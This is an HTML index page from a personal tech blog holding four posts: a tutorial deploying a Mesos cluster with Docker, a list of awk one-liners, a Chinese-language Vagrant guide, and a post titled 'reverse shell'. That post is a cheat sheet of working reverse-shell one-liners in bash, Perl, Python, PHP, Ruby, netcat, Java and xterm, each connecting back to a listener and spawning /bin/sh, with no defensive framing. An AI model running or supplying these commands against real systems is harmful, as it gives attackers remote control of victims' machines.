@@ -1,0 +1,1498 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Cloud,Container,Kubernetes,SDN,Docker" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Feisky's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Notes about anything.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Feisky's Blog">
+<meta property="og:url" content="http://feiskyer.github.io/page/15/index.html">
+<meta property="og:site_name" content="Feisky's Blog">
+<meta property="og:description" content="Notes about anything.">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Feisky's Blog">
+<meta name="twitter:description" content="Notes about anything.">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://feiskyer.github.io/page/15/"/>
+
+
+  <title> Feisky's Blog </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-69699206-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left 
+   page-home 
+ ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Feisky's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">Notes about anything.</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pages">
+          <a href="/pages" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            笔记
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/02/04/deploy-a-mesos-cluster-using-docker/" itemprop="url">
+                  Deploy a Mesos Cluster Using Docker
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-02-05T00:00:00+08:00" content="2015-02-05">
+              2015-02-05
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/mesos/" itemprop="url" rel="index">
+                    <span itemprop="name">mesos</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>his tutorial will show you how to bring up a single node <a href="http://mesosphere.com/" target="_blank" rel="external">Mesos</a> cluster all provisioned out using <a href="http://docker.io/" target="_blank" rel="external">Docker</a> containers (a future post will show how to easily scale this out to multi nodes or see the update on the bottom). This means that you can startup an entire cluster with 7 commands! Nothing to install except for starting out with a working Docker server.</p>
+<p>This will startup 4 containers:</p>
+<ol>
+<li>ZooKeeper</li>
+<li>Meso Master</li>
+<li>Marathon</li>
+<li>Mesos Slave Container</li>
+</ol>
+<p>As mentioned the only prerequisite is to have a working Docker server. This means you can bring up a local <a href="https://docs.vagrantup.com/v2/provisioning/docker.html" target="_blank" rel="external">Vagrant box with Docker installed</a>, use <a href="http://boot2docker.io/" target="_blank" rel="external">Boot2Docker</a>, use <a href="https://coreos.com/" target="_blank" rel="external">CoreOS</a>, instance on AWS, or however you like to get a Docker server.</p>
+<p>The entire process is outlined in this Github repository: <a href="https://github.com/sekka1/mesosphere-docker" target="_blank" rel="external">https://github.com/sekka1/mesosphere-docker</a></p>
+<p>All of the Docker container build files used are there also. You can build each container locally or just use the pre-built containers located on the Docker Hub. The commands below will automatically download the needed pre-built containers for you.</p>
+<p>ZooKeeper: <a href="https://registry.hub.docker.com/u/garland/zookeeper/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/zookeeper/</a></p>
+<p>Meso Master: <a href="https://registry.hub.docker.com/u/garland/mesosphere-docker-mesos-master/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/mesosphere-docker-mesos-master/</a></p>
+<p>Marathon:  <a href="https://registry.hub.docker.com/u/garland/mesosphere-docker-marathon/" target="_blank" rel="external">https://registry.hub.docker.com/u/garland/mesosphere-docker-marathon/</a></p>
+<h3 id="Lets-Get-Started"><a href="#Lets-Get-Started" class="headerlink" title="Lets Get Started"></a>Lets Get Started</h3><p><strong>Step 1:</strong> Get the IP of the Docker server and export it out to the environment. We will use this IP over and over again in subsequent Docker commands.</p>
+<p>Just as a note, this is the IP address of the server and not docker0 or an IP address inside a Docker container. If you ssh into your server and run the command “ifconfig” use the eth0 interface’s address.</p>
+<pre name="feb0" id="feb0" class="graf--pre">
+root@docker-server:/# HOST_IP=10.11.31.7
+</pre>
+
+<p><strong>Step 2:</strong> Start the ZooKeeper container.</p>
+<pre name="c73f" id="c73f" class="graf--pre">
+docker run -d \  
+-p 2181:2181 \  
+-p 2888:2888 \  
+-p 3888:3888 \  
+garland/zookeeper
+</pre>
+
+<p><strong>Step 3:</strong> Start Mesos Master</p>
+<pre name="9331" id="9331" class="graf--pre">
+docker run --net="host" \  
+-p 5050:5050 \  
+-e "MESOS_HOSTNAME=${HOST_IP}" \  
+-e "MESOS_IP=${HOST_IP}" \  
+-e "MESOS_ZK=zk://${HOST_IP}:2181/mesos" \  
+-e "MESOS_PORT=5050" \  
+-e "MESOS_LOG_DIR=/var/log/mesos" \  
+-e "MESOS_QUORUM=1" \  
+-e "MESOS_REGISTRY=in_memory" \  
+-e "MESOS_WORK_DIR=/var/lib/mesos" \  
+-d \  
+garland/mesosphere-docker-mesos-master
+</pre>
+
+<p><strong>Step 4:</strong> Start Marathon</p>
+<pre name="a717" id="a717" class="graf--pre">
+docker run \  
+-d \  
+-p 8080:8080 \  
+garland/mesosphere-docker-marathon --master zk://${HOST_IP}:2181/mesos --zk zk://${HOST_IP}:2181/marathon
+</pre>
+
+<p><strong>Step 5:</strong> Start Mesos Slave in a container</p>
+<pre name="e983" id="e983" class="graf--pre">
+docker run -d \  
+--name mesos_slave_1 \  
+--entrypoint="mesos-slave" \  
+-e "MESOS_MASTER=zk://${HOST_IP}:2181/mesos" \  
+-e "MESOS_LOG_DIR=/var/log/mesos" \  
+-e "MESOS_LOGGING_LEVEL=INFO" \  
+garland/mesosphere-docker-mesos-master:latest
+</pre>
+
+<p><strong>Step 6:</strong> Goto the Mesos’ webpage</p>
+<p>Depending on how you brought up your Docker server and it’s IP address you might have to change the IP you point your browser to but the port will be the same.</p>
+<p>The Mesos webpage will be at this address:</p>
+<pre name="0000" id="0000" class="graf--pre">
+http://${HOST_IP}:5050
+</pre>
+
+<p>Then you should get a page like this but probably at first without all the items in the “Tasks” tables.</p>
+<figure name="d978" id="d978" class="graf--figure">
+    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 554px;">
+        <div class="aspect-ratio-fill" style="padding-bottom: 79.2%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/1010/1*jaUBLpqWBgviqteTk4CuTQ.png)
+    </div>
+</figure>
+
+<p><strong>Step 7:</strong> Goto Marathon’s webpage to start a job</p>
+<p>The Marathon webpage lets you schedule long running tasks onto the Meso Slave container. This is a good test to see if your cluster is up and running. You can view the Marathon’s webpage at:</p>
+<pre name="d885" id="d885" class="graf--pre">
+http://${HOST_IP}:8080
+</pre>
+
+<figure name="dbcb" id="dbcb" class="graf--figure">
+    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 189px;">
+        <div class="aspect-ratio-fill" style="padding-bottom: 27%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/1400/1*0dKOQ7S8Sc53dTK1tezVLA.png)
+    </div>
+</figure>
+
+<p>Clicking on the “New App” button on the top right gives you the following menu where you can create a new job/task. We are simply going to echo out hello to a file. We can go into the container and check if the file is created and if the job is continuously running.</p>
+<figure name="7586" id="7586" class="graf--figure">
+    <div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 1096px;">
+        <div class="aspect-ratio-fill" style="padding-bottom: 156.6%;"></div>![](https://d262ilb51hltx0.cloudfront.net/max/700/1*T2RuhLQE5xawA_whqbB7ig.png)
+    </div>
+</figure>
+
+<p><strong>Step 8:</strong> Check if job/task is running</p>
+<p>Lets check if the job/task is continuously running on the Mesos Slave.</p>
+<p>On the Docker server run the following commands. It will place you inside the slave container and from there tail out the output.txt file.</p>
+<pre name="ff5e" id="ff5e" class="graf--pre">
+docker exec -it mesos_slave_1 /bin/bash  
+root@ca83bf0ea76a:/# tail -f /tmp/output.txt
+</pre>
+
+<p>You will see “hello” being placed into this file about once a second.</p>
+<p>Update: I just updated this projects doc to include how to setup a multi node environment: <a href="https://github.com/sekka1/mesosphere-docker#multi-node-setup" target="_blank" rel="external">https://github.com/sekka1/mesosphere-docker#multi-node-setup</a></p>
+<p>Here is the same article but translated to Chinese: <a href="http://dockerone.com/article/136" target="_blank" rel="external">http://dockerone.com/article/136</a></p>
+<p>From <a href="https://medium.com/@gargar454/deploy-a-mesos-cluster-with-7-commands-using-docker-57951e020586" target="_blank" rel="external">medium gargar454</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/01/27/reverse-shell/" itemprop="url">
+                  reverse shell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-01-28T00:00:00+08:00" content="2015-01-28">
+              2015-01-28
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="Listen-for-8080-first"><a href="#Listen-for-8080-first" class="headerlink" title="Listen for 8080 first"></a>Listen for 8080 first</h3><pre>
+nc -l -p 8080 -vvv
+</pre>
+
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/" target="_blank" rel="external">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
+<pre>
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+</pre>
+
+<h3 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h3><p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell" target="_blank" rel="external">perl-reverse-shell</a>:</p>
+<pre>
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+</pre>
+
+<p>There’s also an&nbsp;<a href="http://www.plenz.com/reverseshell" target="_blank" rel="external">alternative PERL revere shell here</a>.</p>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>This was tested under Linux / Python 2.7:</p>
+<pre>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…</p>
+<pre>
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3>&3 2>&3");'
+</&3></pre>
+
+<p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="external">php-reverse-shell</a>.</p>
+<h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><pre>
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'
+</&%d></pre>
+
+<h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
+<pre>
+nc -e /bin/sh 10.0.0.1 1234
+</pre>
+
+<p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498" target="_blank" rel="external">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
+<pre>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+</pre>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><pre>
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"] as String[])
+p.waitFor()
+</&5></pre>
+
+<p>[Untested submission from anonymous reader]</p>
+<h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<pre>
+xterm -display 10.0.0.1:1
+</pre>
+
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):</p>
+<pre>
+Xnest :1
+</pre>
+
+<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+<pre>
+xhost +targetip
+</pre>
+
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/01/27/awk-examples/" itemprop="url">
+                  awk examples
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-01-28T00:00:00+08:00" content="2015-01-28">
+              2015-01-28
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <ul>
+<li>precede each line by line number</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print NR, $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>replace first field by line number</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;$1=NR; print&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print field 1 and field 2</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $1,$2&#125;'</span> fielname</div></pre></td></tr></table></figure>
+<ul>
+<li>print last field </li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;print $NF&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print non empty lines</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;0&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>print if more than 4 fields</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'NF&gt;4&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li><p>print matching lines (egrep)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'/test.*/&#123;print $0&#125;'</span>  filename</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>print lines where first field matches</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'$1 ~ /^print.*/&#123;print $0&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>calcuting sum of field 2</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'BEGIN&#123;sum=0&#125;&#123;sum+=$2&#125;END&#123;print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>for loop</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;sum=0; for(i=1;i&lt;=NF;i++)sum+=$i; print sum&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>make arrays</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;n = split($0, array); print array[1], array[3]&#125; '</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>reverse a file</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;x[NR]=$0&#125; END&#123;for(i=NR;i&gt;0;i--)print x[i]&#125;'</span> filename</div></pre></td></tr></table></figure>
+<ul>
+<li>Associative Arrays </li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">awk <span class="string">'&#123;amount[$1]=$2&#125; END&#123;for(name in amount) print name, amount[name]&#125;'</span> filename</div></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/01/26/vagrant/" itemprop="url">
+                  vagrant
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-01-27T00:00:00+08:00" content="2015-01-27">
+              2015-01-27
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/vagrant/" itemprop="url" rel="index">
+                    <span itemprop="name">vagrant</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>简易虚拟机管理工具vagrant</p>
+<h3 id="Vagrant简介"><a href="#Vagrant简介" class="headerlink" title="Vagrant简介"></a>Vagrant简介</h3><p>Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共享。</p>
+<h3 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h3><p>1.安装 VirtualBox</p>
+<p>Vagrant支持VMWare和VirtualBox，不过VMWare版本是收费的，简易使用VirtualBox版本。</p>
+<p>VirtualBox下载地址见<a href="http://www.virtualbox.org" target="_blank" rel="external">http://www.virtualbox.org</a></p>
+<p>2.安装 Vagrant</p>
+<p>下载Vagrant <a href="http://downloads.vagrantup.com/" target="_blank" rel="external">http://downloads.vagrantup.com/</a>，根据提示安装。</p>
+<p>首次使用可以下载官方封装好的基础镜像：<br>Ubuntu precise 32 VirtualBox <a href="http://files.vagrantup.com/precise32.box" target="_blank" rel="external">http://files.vagrantup.com/precise32.box</a><br>Ubuntu precise 64 VirtualBox <a href="http://files.vagrantup.com/precise64.box" target="_blank" rel="external">http://files.vagrantup.com/precise64.box</a></p>
+<p><a href="http://www.vagrantbox.es/" target="_blank" rel="external">http://www.vagrantbox.es/</a>提供了丰富的镜像资源，需要时可以去下载。</p>
+<p>3.添加镜像到 Vagrant</p>
+<p>假设我们下载的镜像存放路径是 ~/box/precise64.box，在终端里输入：</p>
+<figure class="highlight processing"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="built_in">box</span> <span class="built_in">add</span> ubuntu ~/<span class="built_in">box</span>/precise64.<span class="built_in">box</span></div></pre></td></tr></table></figure>
+<p>如果上一步没有下载镜像，可以在添加镜像的时候自动下载:</p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="keyword">box </span><span class="keyword">add </span><span class="keyword">base </span>http://files.vagrantup.com/lucid32.<span class="keyword">box</span></div></pre></td></tr></table></figure>
+<p>4.创建虚拟机</p>
+<p>创建一个开发目录，用作虚拟机的工作目录，然后使用ubuntu这个镜像初始化虚拟机：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/dev  <span class="comment"># 切换目录</span></div><div class="line">$ vagrant init ubuntu  <span class="comment"># 初始化</span></div><div class="line">$ vagrant up  <span class="comment"># 启动虚拟机</span></div></pre></td></tr></table></figure>
+<p>启动完毕后就可以通过SSH登录了：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 登录</span></div></pre></td></tr></table></figure>
+<p>注意如果机器上未安装ssh，则可以下载xshell、putty等工具连接，默认端口会自动映射到本机2222端口。</p>
+<p>5.配置文件</p>
+<p>Vagrant 初始化成功后，会在初始化的目录里生成一个 Vagrantfile 的配置文件，可以修改配置文件进行个性化的定制。如配置内网ip地址</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">config</span><span class="selector-class">.vm</span><span class="selector-class">.network</span> <span class="selector-pseudo">:private_network</span>, <span class="selector-tag">ip</span>: "192<span class="selector-class">.168</span><span class="selector-class">.33</span><span class="selector-class">.10</span>"</div></pre></td></tr></table></figure>
+<p>配置hostname，并将虚拟机的80端口映射到本机8080端口</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.hostname</span> = <span class="string">"ubuntu"</span></div><div class="line">config<span class="selector-class">.vm</span><span class="selector-class">.network</span> :forwarded_port, guest: <span class="number">80</span>, host: <span class="number">8080</span></div></pre></td></tr></table></figure>
+<p>6.打包分发</p>
+<p>执行下面的语句，会在当前目录生成一个 package.box 的文件，将这个文件传给其他用户，其他用户只要添加这个 box就可以创建一个相同的虚拟机了：<br><figure class="highlight actionscript"><table><tr><td class="code"><pre><div class="line">$ vagrant <span class="class"><span class="keyword">package</span></span></div></pre></td></tr></table></figure></p>
+<p>7.常用命令</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><div class="line"><span class="variable">$ </span>vagrant init  <span class="comment"># 初始化</span></div><div class="line"><span class="variable">$ </span>vagrant up  <span class="comment"># 启动虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant halt  <span class="comment"># 关闭虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant reload  <span class="comment"># 重启虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant ssh  <span class="comment"># SSH 至虚拟机</span></div><div class="line"><span class="variable">$ </span>vagrant status  <span class="comment"># 查看虚拟机运行状态</span></div><div class="line"><span class="variable">$ </span>vagrant destroy  <span class="comment"># 销毁当前虚拟机</span></div></pre></td></tr></table></figure>
+<p>8.注意事项</p>
+<p>使用 Apache/Nginx 时会出现诸如图片修改后但页面刷新仍然是旧文件的情况，是由于静态文件缓存造成的。需要对虚拟机里的 Apache/Nginx 配置文件进行修改：</p>
+<p>Apache 配置添加:</p>
+<p>EnableSendfile off</p>
+<p>Nginx 配置添加:</p>
+<p>sendfile off;</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
